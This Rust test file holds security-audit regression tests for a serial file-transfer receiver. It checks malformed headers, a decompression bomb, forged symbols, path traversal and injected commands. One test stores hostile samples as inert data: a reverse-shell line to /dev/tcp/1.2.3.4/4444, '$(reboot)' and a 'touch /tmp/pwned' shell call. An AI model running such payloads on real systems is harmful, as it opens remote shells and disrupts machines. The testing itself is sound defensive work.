//! Security-audit regression tests (see docs/SECURITY_AUDIT.md).
//!
//! Every test asserts the *secure* behaviour, so it FAILS on the audited
//! revision (40c00f8) and passes once the matching finding is fixed.
//! All tests run inside temp dirs; cases that may abort or hang run in a child
//! copy of the test binary under RLIMIT_AS, so the harness itself is never hurt.
//!
//! Wire this in with:   #[cfg(test)] mod audit_regressions;   (in main.rs)

use super::*;
use std::fs::File;
use std::process::{Command, Stdio};

// ------------------------------------------------------------------ helpers
fn tmpdir(name: &str) -> PathBuf {
    let p = std::env::temp_dir().join(format!("sxfer_audit_{}_{}", name, std::process::id()));
    let _ = fs::remove_dir_all(&p);
    fs::create_dir_all(&p).unwrap();
    p
}

#[allow(clippy::too_many_arguments)]
fn hdr(
    id: [u8; 8],
    ft: u8,
    mode: u32,
    size: u64,
    psize: u64,
    csz: u32,
    meth: u8,
    crc: u32,
    path: &str,
    link: &str,
) -> Vec<u8> {
    let mut h = Vec::new();
    h.extend_from_slice(&id);
    h.push(ft);
    h.extend_from_slice(&mode.to_be_bytes());
    h.extend_from_slice(&1000u32.to_be_bytes());
    h.extend_from_slice(&1000u32.to_be_bytes());
    h.extend_from_slice(&1_700_000_000u64.to_be_bytes());
    h.extend_from_slice(&0u32.to_be_bytes());
    h.extend_from_slice(&size.to_be_bytes());
    h.extend_from_slice(&psize.to_be_bytes());
    let k = if psize > 0 && csz > 0 {
        (psize as usize).div_ceil(csz as usize) as u32
    } else {
        1u32
    };
    h.extend_from_slice(&k.to_be_bytes());
    h.extend_from_slice(&csz.to_be_bytes());
    h.extend_from_slice(&0u16.to_be_bytes());
    h.push(meth);
    h.push(9);
    h.extend_from_slice(&crc.to_be_bytes());
    h.extend_from_slice(&(path.len() as u16).to_be_bytes());
    h.extend_from_slice(path.as_bytes());
    h.extend_from_slice(&(link.len() as u16).to_be_bytes());
    h.extend_from_slice(link.as_bytes());
    h
}

fn data(id: [u8; 8], esi: u32, sym: &[u8]) -> Vec<u8> {
    let mut p = Vec::new();
    p.extend_from_slice(&id);
    p.extend_from_slice(&esi.to_be_bytes());
    p.extend_from_slice(&(sym.len() as u32).to_be_bytes());
    p.extend_from_slice(sym);
    p
}

#[cfg(unix)]
fn limit_address_space(bytes: u64) {
    #[repr(C)]
    struct RLimit {
        cur: u64,
        max: u64,
    }
    extern "C" {
        fn setrlimit(resource: i32, rlim: *const RLimit) -> i32;
    }
    const RLIMIT_AS: i32 = 9;
    let r = RLimit {
        cur: bytes,
        max: bytes,
    };
    assert_eq!(unsafe { setrlimit(RLIMIT_AS, &r) }, 0);
}

fn rss_kb() -> u64 {
    fs::read_to_string("/proc/self/status")
        .ok()
        .and_then(|s| {
            s.lines()
                .find(|l| l.starts_with("VmHWM:"))
                .map(|l| l.to_string())
        })
        .and_then(|l| l.split_whitespace().nth(1).and_then(|v| v.parse().ok()))
        .unwrap_or(0)
}

/// Re-run this test binary for a single `audit_child` case.
/// Returns (exited_in_time, success, stderr).
fn run_child(case: &str, timeout: Duration) -> (bool, bool, String) {
    let mut child = Command::new(std::env::current_exe().unwrap())
        .args([
            "--exact",
            "audit_regressions::audit_child",
            "--nocapture",
            "--test-threads=1",
        ])
        .env("AUDIT_CASE", case)
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    let start = Instant::now();
    loop {
        if let Some(st) = child.try_wait().unwrap() {
            let mut err = String::new();
            use std::io::Read as _;
            child
                .stderr
                .take()
                .unwrap()
                .read_to_string(&mut err)
                .unwrap();
            return (true, st.success(), err);
        }
        if start.elapsed() > timeout {
            let _ = child.kill();
            let _ = child.wait();
            return (false, false, String::new());
        }
        thread::sleep(Duration::from_millis(50));
    }
}

fn test_ctx(out: PathBuf) -> ReceiverContext {
    ReceiverContext::new(out, false, None, false, None, 300)
}

// ------------------------------------------------------------------ child body
/// Not a real test: it is the payload that `run_child` executes in a sandboxed process.
#[test]
fn audit_child() {
    let case = match std::env::var("AUDIT_CASE") {
        Ok(c) => c,
        Err(_) => return,
    };
    #[cfg(unix)]
    limit_address_space(512 << 20);
    let out = tmpdir(&format!("child_{}", case));
    let mut ctx = test_ctx(out.clone());
    let id = [1u8; 8];
    match case.as_str() {
        "csz0" => ctx.process_frame(&hdr(id, b'f', 0o644, 10, 10, 0, 0, 0, "a.txt", ""), 0),
        "csz_huge" => ctx.process_frame(
            &hdr(id, b'f', 0o644, 1, 1, 0x7fff_ffff, 0, 0, "d.txt", ""),
            0,
        ),
        "psize_huge" => ctx.process_frame(
            &hdr(id, b'f', 0o644, 1, 1u64 << 40, 1, 0, 0, "c.txt", ""),
            0,
        ),
        "size_huge" => {
            ctx.process_frame(
                &hdr(id, b'f', 0o644, 1u64 << 50, 1, 1, 1, 0, "b.txt", ""),
                0,
            );
            ctx.process_frame(&data(id, 0, &[0x5d]), 0);
        }
        "ansi" => ctx.process_frame(
            &hdr(id, b'd', 0o755, 0, 0, 0, 0, 0, "\x1b]0;PWNED\x07dir", ""),
            0,
        ),
        "no_delim" => {
            let stream = out.join("stream.bin");
            {
                let mut f = File::create(&stream).unwrap();
                let chunk = vec![b'A'; 65536];
                for _ in 0..256 {
                    f.write_all(&chunk).unwrap();
                }
            }
            let before = rss_kb();
            do_recv(&[
                "-d".into(),
                stream.display().to_string(),
                "-o".into(),
                out.join("o").display().to_string(),
                "-q".into(),
                "1".into(),
            ])
            .unwrap();
            let grown_kb = rss_kb().saturating_sub(before);
            // 16 MiB of delimiter-less garbage must not be retained.
            if grown_kb > 4 * 1024 {
                eprintln!("RETAINED {} KiB", grown_kb);
                std::process::exit(3);
            }
        }
        "watch_devfull" => {
            let w = out.join("w");
            fs::create_dir_all(&w).unwrap();
            fs::write(w.join("important.txt"), b"payload").unwrap();
            thread::spawn(|| {
                thread::sleep(Duration::from_millis(2500));
                STOP_FLAG.store(true, Ordering::SeqCst);
            });
            let _ = do_send(&[
                "-d".into(),
                "/dev/full".into(),
                "-w".into(),
                w.display().to_string(),
            ]);
            if !w.join("important.txt").exists() {
                eprintln!("DELETED-UNSENT");
                std::process::exit(4);
            }
        }
        "watch_fifo" => {
            let w = out.join("w");
            fs::create_dir_all(&w).unwrap();
            let c = std::ffi::CString::new(w.join("pipe").to_string_lossy().as_bytes()).unwrap();
            extern "C" {
                fn mkfifo(path: *const std::os::raw::c_char, mode: u32) -> i32;
            }
            assert_eq!(unsafe { mkfifo(c.as_ptr(), 0o644) }, 0);
            thread::spawn(|| {
                thread::sleep(Duration::from_millis(1500));
                STOP_FLAG.store(true, Ordering::SeqCst);
            });
            let _ = do_send(&[
                "-d".into(),
                out.join("line.bin").display().to_string(),
                "-w".into(),
                w.display().to_string(),
            ]);
        }
        other => panic!("unknown case {}", other),
    }
}

// ------------------------------------------------------------------ F-01 / F-02 / F-03
#[test]
fn f01_zero_csz_header_must_not_abort() {
    let (_, ok, err) = run_child("csz0", Duration::from_secs(20));
    assert!(ok, "receiver died on psize>0,csz=0 header: {}", err);
}

#[test]
fn f02_huge_csz_header_must_not_abort() {
    let (_, ok, err) = run_child("csz_huge", Duration::from_secs(20));
    assert!(ok, "receiver died on csz=0x7fffffff header: {}", err);
}

#[test]
fn f02_huge_psize_header_must_not_abort() {
    let (_, ok, err) = run_child("psize_huge", Duration::from_secs(20));
    assert!(ok, "receiver died on psize=2^40 header: {}", err);
}

#[test]
fn f03_huge_size_with_lzma_must_not_abort() {
    let (_, ok, err) = run_child("size_huge", Duration::from_secs(20));
    assert!(ok, "receiver died on size=2^50 + meth=1: {}", err);
}

// ------------------------------------------------------------------ F-04
#[test]
fn f04_decompress_must_not_exceed_declared_size() {
    // 8 MiB of zeros -> ~1.3 KiB .lzma stream (needs the `xz` CLI to build the bomb; skipped otherwise).
    use std::io::Write as _;
    let mut xz = match Command::new("xz")
        .args(["--format=lzma", "-9", "-c"])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
    {
        Ok(c) => c,
        Err(_) => return,
    };
    let mut stdin = xz.stdin.take().unwrap();
    let feeder = thread::spawn(move || stdin.write_all(&vec![0u8; 8 << 20]).unwrap());
    let bomb = xz.wait_with_output().unwrap().stdout;
    feeder.join().unwrap();
    assert!(bomb.len() < 4096, "bomb is {} bytes", bomb.len());
    assert!(
        decompress_lzma2(&bomb, 1024).is_err(),
        "decompressor produced 8 MiB from a {}-byte input although size=1024",
        bomb.len()
    );
}

// ------------------------------------------------------------------ F-05
#[test]
fn f05_delimiterless_stream_must_not_grow_input_buffer() {
    let (_, ok, err) = run_child("no_delim", Duration::from_secs(120));
    assert!(ok, "input buffer retained garbage: {}", err);
}

// ------------------------------------------------------------------ F-06
#[test]
fn f06_early_symbols_for_unknown_ids_are_bounded() {
    let mut ctx = test_ctx(tmpdir("early"));
    for i in 0..1000u64 {
        ctx.process_frame(&data(i.to_be_bytes(), 0, &vec![0xAB; 4096]), 0);
    }
    let retained: usize = ctx
        .table
        .values()
        .map(|f| f.early_syms.iter().map(|e| e.data.len()).sum::<usize>())
        .sum();
    assert!(
        retained <= 1 << 20,
        "retained {} bytes of unauthenticated early symbols",
        retained
    );
    assert!(
        ctx.table.len() <= 256,
        "table holds {} unknown ids",
        ctx.table.len()
    );
}

// ------------------------------------------------------------------ F-07
#[test]
fn f07_forged_symbol_must_not_permanently_poison_a_transfer() {
    let out = tmpdir("poison");
    let mut ctx = test_ctx(out.clone());
    let payload: Vec<u8> = (0..3000u32).map(|i| (i * 7 % 251) as u8).collect();
    let id = [9u8; 8];
    let enc = RaptorQEncoder::new(&payload, 1024).unwrap();
    let mut sym = vec![0u8; 1024];
    ctx.process_frame(
        &hdr(
            id,
            b'f',
            0o644,
            3000,
            3000,
            1024,
            0,
            Crc32::calculate(&payload),
            "h.bin",
            "",
        ),
        0,
    );
    for e in 0..2u32 {
        enc.encode_symbol(e, &mut sym);
        ctx.process_frame(&data(id, e, &sym), 0);
    }
    ctx.process_frame(&data(id, 2, &vec![0xEE; 1024]), 0); // forged
    for e in 2..60u32 {
        enc.encode_symbol(e, &mut sym);
        ctx.process_frame(&data(id, e, &sym), 0); // plenty of genuine symbols
    }
    assert_eq!(
        fs::read(out.join("h.bin")).ok(),
        Some(payload),
        "genuine symbols could not repair the transfer"
    );
}

// ------------------------------------------------------------------ F-08 (needs root)
#[test]
#[cfg(unix)]
#[ignore = "run as root: cargo test f08 -- --ignored"]
fn f08_root_receiver_must_not_chown_to_uid_1000_without_dash_p() {
    use std::os::unix::fs::MetadataExt;
    let out = tmpdir("chown");
    let mut ctx = test_ctx(out.clone());
    let payload = b"hi".to_vec();
    let id = [5u8; 8];
    ctx.process_frame(
        &hdr(
            id,
            b'f',
            0o644,
            2,
            2,
            2,
            0,
            Crc32::calculate(&payload),
            "f",
            "",
        ),
        0,
    );
    ctx.process_frame(&data(id, 0, &payload), 0);
    let m = fs::metadata(out.join("f")).unwrap();
    assert_ne!(
        m.uid(),
        1000,
        "file was chowned to uid 1000 although -p was not given"
    );
}

// ------------------------------------------------------------------ F-09 / F-10
#[test]
fn f09_watch_mode_must_not_delete_when_device_writes_fail() {
    let (_, ok, err) = run_child("watch_devfull", Duration::from_secs(30));
    assert!(
        ok,
        "source deleted although every device write failed: {}",
        err
    );
}

#[test]
fn f10_fifo_in_watch_dir_must_not_hang_the_sender() {
    let (exited, _, _) = run_child("watch_fifo", Duration::from_secs(8));
    assert!(
        exited,
        "sender hung on a FIFO planted in the watch directory"
    );
}

// ------------------------------------------------------------------ F-13
#[test]
fn f13_temp_name_must_not_clobber_sibling_files() {
    let out = tmpdir("tmpname");
    fs::write(out.join("a.sxfer-part"), b"precious").unwrap();
    let mut ctx = test_ctx(out.clone());
    let id = [6u8; 8];
    ctx.process_frame(
        &hdr(
            id,
            b'f',
            0o644,
            2,
            2,
            2,
            0,
            Crc32::calculate(b"hi"),
            "a.txt",
            "",
        ),
        0,
    );
    ctx.process_frame(&data(id, 0, b"hi"), 0);
    assert_eq!(fs::read(out.join("a.txt")).unwrap(), b"hi");
    assert_eq!(
        fs::read(out.join("a.sxfer-part")).ok().as_deref(),
        Some(&b"precious"[..]),
        "unrelated file deleted"
    );
}

// ------------------------------------------------------------------ F-14
#[test]
fn f14_log_output_must_not_contain_raw_control_bytes_from_the_wire() {
    let (_, _, err) = run_child("ansi", Duration::from_secs(20));
    assert!(
        !err.contains('\x1b'),
        "ESC byte from remote path reached the log"
    );
}

// ------------------------------------------------------------------ F-15
#[test]
#[cfg(unix)]
fn f15_directory_header_must_not_chmod_a_regular_file() {
    use std::os::unix::fs::PermissionsExt;
    let out = tmpdir("dirhdr");
    fs::write(out.join("x"), b"data").unwrap();
    fs::set_permissions(out.join("x"), fs::Permissions::from_mode(0o644)).unwrap();
    let mut ctx = test_ctx(out.clone());
    ctx.process_frame(&hdr([7u8; 8], b'd', 0o000, 0, 0, 0, 0, 0, "x", ""), 0);
    ctx.finish();
    assert_eq!(
        fs::metadata(out.join("x")).unwrap().permissions().mode() & 0o777,
        0o644
    );
}

// ------------------------------------------------------------------ F-16 / F-17 / F-18
#[test]
fn f16_daemon_receiver_args_must_be_accepted_by_recv() {
    // service.rs passes "-k" when keep_damaged=true; `recv` must understand every flag the daemon emits.
    assert!(do_recv(&["-k".into(), "-h".into()]).is_ok());
}

#[test]
fn f17_config_with_lone_quote_must_not_panic() {
    let r = std::panic::catch_unwind(|| config::SxferConfig::parse_str("[general]\nport = \"\n"));
    assert!(r.is_ok(), "config parser panicked on a lone quote");
}

#[test]
fn f18_zero_rounds_must_be_rejected() {
    let d = tmpdir("rounds0");
    fs::write(d.join("f.txt"), b"hello").unwrap();
    let r = do_send(&[
        "-d".into(),
        d.join("line.bin").display().to_string(),
        "-r".into(),
        "0".into(),
        d.join("f.txt").display().to_string(),
    ]);
    assert!(r.is_err(), "-r 0 silently transmits headers only");
}

// ------------------------------------------------------------------ F-09 additional cases
#[test]
#[cfg(unix)]
fn f09_unreadable_subdir_and_unsupported_types_fail_the_batch() {
    use std::os::unix::fs::PermissionsExt;
    let d = tmpdir("f09_skip");
    let src = d.join("src");
    fs::create_dir_all(src.join("locked")).unwrap();
    fs::write(src.join("locked/f"), b"x").unwrap();
    fs::set_permissions(src.join("locked"), fs::Permissions::from_mode(0o000)).unwrap();
    let unreadable_is_enforced = fs::read_dir(src.join("locked")).is_err(); // false when running as root
    let mut line = File::create(d.join("line.bin")).unwrap();
    let r = send_batch(vec![src.clone()], &mut line, 115200, 1024, 35, 1, None);
    fs::set_permissions(src.join("locked"), fs::Permissions::from_mode(0o700)).unwrap();
    if unreadable_is_enforced {
        assert!(r.is_err(), "unreadable directory silently skipped");
    }
    // a unix socket cannot be transmitted: the batch must report it
    let sock = d.join("sock");
    let _l = std::os::unix::net::UnixListener::bind(&sock).unwrap();
    assert!(
        send_batch(vec![sock], &mut line, 115200, 1024, 35, 1, None).is_err(),
        "unsupported file type silently skipped"
    );
}

#[test]
fn f09_tree_snapshot_detects_additions_and_edits() {
    let d = tmpdir("f09_snap");
    fs::write(d.join("a"), b"1").unwrap();
    let s1 = tree_snapshot(&d).unwrap();
    assert_eq!(s1, tree_snapshot(&d).unwrap());
    fs::write(d.join("b"), b"2").unwrap();
    assert_ne!(s1, tree_snapshot(&d).unwrap(), "new file not noticed");
}

#[test]
fn f09_successful_watch_send_still_deletes() {
    let d = tmpdir("f09_ok");
    let src = d.join("f.txt");
    fs::write(&src, b"hello").unwrap();
    let mut line = File::create(d.join("line.bin")).unwrap();
    assert!(send_batch(vec![src], &mut line, 115200, 1024, 35, 1, None).is_ok());
}

// ------------------------------------------------------------------ Additional hardening tests
#[test]
fn test_inconsistent_sizes_and_symbol_counts_rejected() {
    let out = tmpdir("inconsistent");
    let mut ctx = test_ctx(out);
    let id = [11u8; 8];

    // Case 1: uncompressed stored (meth=0) but size != psize
    let h1 = hdr(id, b'f', 0o644, 100, 200, 100, 0, 0, "inc1.txt", "");
    assert!(ParsedHeader::parse(&h1).is_err());
    ctx.process_frame(&h1, 0);
    assert!(!ctx.table.contains_key(&id));

    // Case 2: k does not match ceil(psize / csz)
    let mut h2 = hdr(id, b'f', 0o644, 1000, 1000, 100, 0, 0, "inc2.txt", "");
    // overwrite k (bytes 49..53) with 5 instead of 10
    h2[49..53].copy_from_slice(&5u32.to_be_bytes());
    assert!(ParsedHeader::parse(&h2).is_err());
    ctx.process_frame(&h2, 0);
    assert!(!ctx.table.contains_key(&id));

    // Case 3: directory with nonzero size
    let h3 = hdr(id, b'd', 0o755, 100, 0, 0, 0, 0, "inc_dir", "");
    assert!(ParsedHeader::parse(&h3).is_err());
}

#[test]
fn test_invalid_compression_method_rejected() {
    let out = tmpdir("invalid_meth");
    let mut ctx = test_ctx(out);
    let id = [12u8; 8];

    for bad_meth in [2u8, 3, 10, 255] {
        let h = hdr(
            id,
            b'f',
            0o644,
            100,
            100,
            100,
            bad_meth,
            0,
            "bad_meth.txt",
            "",
        );
        assert!(
            ParsedHeader::parse(&h).is_err(),
            "meth={} was not rejected",
            bad_meth
        );
        ctx.process_frame(&h, 0);
        assert!(!ctx.table.contains_key(&id));
    }
}

#[test]
fn test_excessive_and_duplicate_early_symbols() {
    let out = tmpdir("dup_early");
    let mut ctx = test_ctx(out);
    let id = [13u8; 8];
    let sym = vec![0x42; 1024];

    // Send 500 identical symbols for the same ESI
    for _ in 0..500 {
        ctx.process_frame(&data(id, 0, &sym), 0);
    }
    let f = ctx.table.get(&id).unwrap();
    assert_eq!(
        f.early_syms.len(),
        1,
        "duplicate early symbol was stored multiple times"
    );

    // Send 500 distinct ESIs for the same ID without a header
    for esi in 1..500u32 {
        ctx.process_frame(&data(id, esi, &sym), 0);
    }
    let f = ctx.table.get(&id).unwrap();
    assert!(
        f.early_syms.len() <= MAX_EARLY_SYMBOLS_PER_ID,
        "early symbols exceeded per-id limit"
    );
}

#[test]
fn test_truncated_and_malformed_frames() {
    let out = tmpdir("malformed_frames");
    let mut ctx = test_ctx(out);

    // Short / truncated payloads
    for len in 0..16 {
        let garbage = vec![0xAA; len];
        ctx.process_frame(&garbage, 0);
    }

    // Corrupted header frame (truncated mid-path)
    let id = [14u8; 8];
    let mut h = hdr(id, b'f', 0o644, 10, 10, 10, 0, 0, "somelongpath.txt", "");
    h.truncate(68); // truncate inside path
    ctx.process_frame(&h, 0);
    assert!(!ctx.table.contains_key(&id));
}

#[test]
fn test_receiver_recovery_after_invalid_input_followed_by_valid_transfer() {
    let out = tmpdir("recovery");
    let mut ctx = test_ctx(out.clone());

    // 1. Bombard receiver with invalid / malformed frames
    let bad_id = [0xFF; 8];
    ctx.process_frame(&[], 0);
    ctx.process_frame(&[1, 2, 3], 0);
    ctx.process_frame(
        &hdr(
            bad_id,
            b'f',
            0o644,
            1 << 40,
            1 << 40,
            0,
            0,
            0,
            "bad.txt",
            "",
        ),
        0,
    );
    ctx.process_frame(
        &hdr(bad_id, b'f', 0o644, 100, 100, 100, 99, 0, "bad2.txt", ""),
        0,
    );
    for _ in 0..100 {
        ctx.process_frame(&data(bad_id, 0, &vec![0xCC; 2048]), 0);
    }

    // 2. Perform a genuine valid transfer
    let good_id = [0x42; 8];
    let payload = b"Hello, resilient world! SXFER security audit test payload.".to_vec();
    let crc = Crc32::calculate(&payload);
    let sym_size = payload.len() as u32;

    let good_hdr = hdr(
        good_id,
        b'f',
        0o644,
        payload.len() as u64,
        payload.len() as u64,
        sym_size,
        0,
        crc,
        "valid.txt",
        "",
    );
    ctx.process_frame(&good_hdr, 0);
    ctx.process_frame(&data(good_id, 0, &payload), 0);

    // 3. Verify valid transfer succeeded despite earlier onslaught
    let written = fs::read(out.join("valid.txt")).expect("valid file should be written");
    assert_eq!(written, payload);
    assert_eq!(ctx.nok, 1);
}

// ------------------------------------------------------------------ Authenticated Transfer Tests
#[test]
fn test_authenticated_transfer_full_pipeline() {
    let d = tmpdir("auth_pipeline");
    let src_dir = d.join("src");
    let dst_dir = d.join("dst");
    fs::create_dir_all(&src_dir).unwrap();
    fs::create_dir_all(&dst_dir).unwrap();

    // Create test files in source directory
    let file1_data = b"Authentication layer unit test data 1 - critical payload".to_vec();
    let file2_data = b"Authentication layer unit test data 2 - secondary file".to_vec();
    fs::write(src_dir.join("file1.txt"), &file1_data).unwrap();
    fs::write(src_dir.join("file2.txt"), &file2_data).unwrap();

    // Generate sender keypair
    let (priv_bytes, pub_bytes) = auth::generate_keypair().unwrap();
    let priv_path = d.join("test_sender.priv");
    let pub_path = d.join("test_sender.pub");
    auth::save_keypair(&priv_path, &pub_path, &priv_bytes, &pub_bytes).unwrap();
    let keypair = auth::load_private_key(&priv_path).unwrap();
    let trusted_pub = auth::load_public_key(&pub_path).unwrap();

    // Transmit via send_batch to pipe
    let pipe_file_path = d.join("serial_pipe.bin");
    let mut pipe_file = File::create(&pipe_file_path).unwrap();
    let send_res = send_batch(
        vec![src_dir.join("file1.txt"), src_dir.join("file2.txt")],
        &mut pipe_file,
        115200,
        1024,
        35,
        1,
        Some(std::sync::Arc::new(keypair)),
    );
    assert!(send_res.is_ok(), "send_batch failed: {:?}", send_res);

    // Read bytes from pipe and process on receiver in authenticated mode
    let pipe_bytes = fs::read(&pipe_file_path).unwrap();
    let mut rx = ReceiverContext::new(dst_dir.clone(), false, Some(trusted_pub), true, None, 300);

    let mut p = 0;
    while p < pipe_bytes.len() {
        while p < pipe_bytes.len() && pipe_bytes[p] == 0x00 {
            p += 1;
        }
        if p >= pipe_bytes.len() {
            break;
        }
        if let Some(pos) = pipe_bytes[p..].iter().position(|&b| b == 0x00) {
            let candidate = &pipe_bytes[p..p + pos];
            if candidate.len() >= 32 {
                if let Some(res) = mod_frame_decode(candidate) {
                    rx.process_frame(&res.payload, res.bit_corrections);
                }
            }
            p += pos + 1;
        } else {
            break;
        }
    }
    rx.finish();

    // Assert files are published to destination directory
    let read1 = fs::read(dst_dir.join("file1.txt")).expect("file1.txt should be published");
    let read2 = fs::read(dst_dir.join("file2.txt")).expect("file2.txt should be published");
    assert_eq!(read1, file1_data);
    assert_eq!(read2, file2_data);
}

#[test]
fn test_authenticated_transfer_wrong_key_rejected() {
    let d = tmpdir("auth_wrong_key");
    let src_dir = d.join("src");
    let dst_dir = d.join("dst");
    fs::create_dir_all(&src_dir).unwrap();
    fs::create_dir_all(&dst_dir).unwrap();

    let secret_data = b"Top secret corporate data".to_vec();
    fs::write(src_dir.join("secret.txt"), &secret_data).unwrap();

    // Keypair A (sender)
    let (priv_a, pub_a) = auth::generate_keypair().unwrap();
    let priv_a_path = d.join("a.priv");
    let pub_a_path = d.join("a.pub");
    auth::save_keypair(&priv_a_path, &pub_a_path, &priv_a, &pub_a).unwrap();
    let keypair_a = auth::load_private_key(&priv_a_path).unwrap();

    // Keypair B (receiver's trusted key, does not match sender)
    let (_priv_b, pub_b) = auth::generate_keypair().unwrap();

    let pipe_file_path = d.join("serial_pipe.bin");
    let mut pipe_file = File::create(&pipe_file_path).unwrap();
    let send_res = send_batch(
        vec![src_dir.join("secret.txt")],
        &mut pipe_file,
        115200,
        1024,
        35,
        1,
        Some(std::sync::Arc::new(keypair_a)),
    );
    assert!(send_res.is_ok());

    let pipe_bytes = fs::read(&pipe_file_path).unwrap();
    let mut rx = ReceiverContext::new(
        dst_dir.clone(),
        false,
        Some(pub_b), // Trusted key is B!
        true,
        None,
        300,
    );

    let mut p = 0;
    while p < pipe_bytes.len() {
        while p < pipe_bytes.len() && pipe_bytes[p] == 0x00 {
            p += 1;
        }
        if p >= pipe_bytes.len() {
            break;
        }
        if let Some(pos) = pipe_bytes[p..].iter().position(|&b| b == 0x00) {
            let candidate = &pipe_bytes[p..p + pos];
            if candidate.len() >= 32 {
                if let Some(res) = mod_frame_decode(candidate) {
                    rx.process_frame(&res.payload, res.bit_corrections);
                }
            }
            p += pos + 1;
        } else {
            break;
        }
    }
    rx.finish();

    // File MUST NOT be published to destination!
    assert!(
        !dst_dir.join("secret.txt").exists(),
        "Secret file was published despite wrong key!"
    );
}

#[test]
fn test_authenticated_transfer_replay_attack_rejected() {
    let d = tmpdir("auth_replay");
    let cache_file = d.join("replay_cache.txt");
    let mut cache = auth::ReplayCache::new(Some(cache_file.clone()));

    let transfer_id = "0123456789abcdef0123456789abcdef";
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs() as i64;

    // First time should succeed
    assert!(cache.check_and_record(transfer_id, now, 300).is_ok());

    // Second time with identical transfer ID must be rejected as replay
    let replay_err = cache.check_and_record(transfer_id, now, 300);
    assert!(replay_err.is_err(), "Replayed transfer ID was accepted!");

    // Check disk persistence
    let mut cache2 = auth::ReplayCache::new(Some(cache_file));
    let replay_err2 = cache2.check_and_record(transfer_id, now, 300);
    assert!(
        replay_err2.is_err(),
        "Replayed transfer ID was accepted after reloading cache from disk!"
    );
}

#[test]
fn test_require_auth_rejects_unauthenticated_transfers() {
    let d = tmpdir("require_auth_reject");
    let out = d.join("out");
    fs::create_dir_all(&out).unwrap();

    let mut ctx = ReceiverContext::new(
        out.clone(),
        false,
        None, // No key
        true, // require_auth = true
        None,
        300,
    );

    let payload = b"Unauthenticated legacy file".to_vec();
    let id = [0x77; 8];
    let header = hdr(
        id,
        b'f',
        0o644,
        payload.len() as u64,
        payload.len() as u64,
        payload.len() as u32,
        0,
        Crc32::calculate(&payload),
        "unauth.txt",
        "",
    );

    ctx.process_frame(&header, 0);
    ctx.process_frame(&data(id, 0, &payload), 0);
    ctx.finish();

    assert!(
        !out.join("unauth.txt").exists(),
        "Unauthenticated file was published when --require-auth was active!"
    );
}

// ------------------------------------------------------------------ Remote Control Impossibility Tests
#[test]
fn test_arbitrary_uart_bytes_cannot_invoke_process_execution() {
    let out = tmpdir("no_exec");
    let mut ctx = test_ctx(out.clone());

    // Inject command injection strings into serial receiver frames
    let injection_payloads = [
        b"; /bin/sh -c 'touch /tmp/pwned'\n".to_vec(),
        b"`id` $(reboot) | bash -i >& /dev/tcp/1.2.3.4/4444 0>&1".to_vec(),
        b"\x1b]0;cmd.exe /c calc.exe\x07\r\n".to_vec(),
        b"\x00\x00\x00\x00\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00".to_vec(),
    ];

    for (i, pay) in injection_payloads.iter().enumerate() {
        let id = [0x90 + i as u8; 8];
        let h = hdr(
            id,
            b'f',
            0o755,
            pay.len() as u64,
            pay.len() as u64,
            pay.len() as u32,
            0,
            Crc32::calculate(pay),
            &format!("script_{}.sh", i),
            "",
        );
        ctx.process_frame(&h, 0);
        ctx.process_frame(&data(id, 0, pay), 0);
    }
    ctx.finish();

    // Verify all files are saved purely as inert passive files on disk
    for (i, expected_payload) in injection_payloads.iter().enumerate() {
        let path = out.join(format!("script_{}.sh", i));
        assert!(path.exists());
        let read = fs::read(&path).unwrap();
        assert_eq!(&read, expected_payload);
    }
    // Verify /tmp/pwned was NOT created
    assert!(!Path::new("/tmp/pwned").exists());
}

#[test]
fn test_unknown_and_unsupported_frame_types_rejected() {
    let out = tmpdir("unknown_ftype");
    let mut ctx = test_ctx(out);

    // Frame types that must be rejected: 'x' (exec), 'c' (command), 's' (shell), 'e' (eval), etc.
    let forbidden_types = [b'x', b'c', b's', b'e', b'r', b'!', b'?', 0x00, 0xFF, 0x7F];

    for &ft in &forbidden_types {
        let id = [0x55, ft, 0, 0, 0, 0, 0, 1];
        let h = hdr(id, ft, 0o644, 100, 100, 100, 0, 0, "test.bin", "");
        assert!(
            ParsedHeader::parse(&h).is_err(),
            "Frame type 0x{:02x} ('{}') was not rejected by parser!",
            ft,
            ft as char
        );
        ctx.process_frame(&h, 0);
        assert!(
            !ctx.table.contains_key(&id),
            "Frame type 0x{:02x} created state table entry!",
            ft
        );
    }
}

#[test]
fn test_received_scripts_and_executables_never_executed() {
    let out = tmpdir("inert_storage");
    let mut ctx = test_ctx(out.clone());

    let script = b"#!/bin/sh\necho PWNED > /tmp/sxfer_test_pwned.txt\nexit 0\n".to_vec();
    let id = [0x88; 8];
    let h = hdr(
        id,
        b'f',
        0o755,
        script.len() as u64,
        script.len() as u64,
        script.len() as u32,
        0,
        Crc32::calculate(&script),
        "runme.sh",
        "",
    );

    ctx.process_frame(&h, 0);
    ctx.process_frame(&data(id, 0, &script), 0);
    ctx.finish();

    // Script exists on disk as inert data
    let dest_script = out.join("runme.sh");
    assert!(dest_script.exists());
    assert_eq!(fs::read(&dest_script).unwrap(), script);

    // Verify it was never executed
    assert!(!Path::new("/tmp/sxfer_test_pwned.txt").exists());
}

#[test]
fn test_path_traversal_and_namespace_escape_attacks_blocked() {
    let out = tmpdir("traversal_block");
    let ctx = test_ctx(out);

    let bad_paths = [
        "../evil.txt",
        "a/../../evil.txt",
        "/etc/passwd",
        "/usr/local/bin/evil",
        "C:\\Windows\\System32\\cmd.exe",
        "\\\\?\\Volume{12345}\\evil",
        "CON",
        "PRN",
        "AUX",
        "NUL",
        "COM1",
        "COM2",
        "LPT1",
        "dir/\0evil.txt",
        "dir/\x1b[31mevil.txt",
    ];

    for (i, &bad_path) in bad_paths.iter().enumerate() {
        let id = [0xAA, i as u8, 0, 0, 0, 0, 0, 0];
        let h = hdr(id, b'f', 0o644, 10, 10, 10, 0, 0, bad_path, "");
        // Parser or prep_dest must reject
        let parse_res = ParsedHeader::parse(&h);
        let prep_res = ctx.prep_dest(bad_path);
        assert!(
            parse_res.is_err() || prep_res.is_none(),
            "Bad path '{}' was accepted!",
            bad_path
        );
    }
}
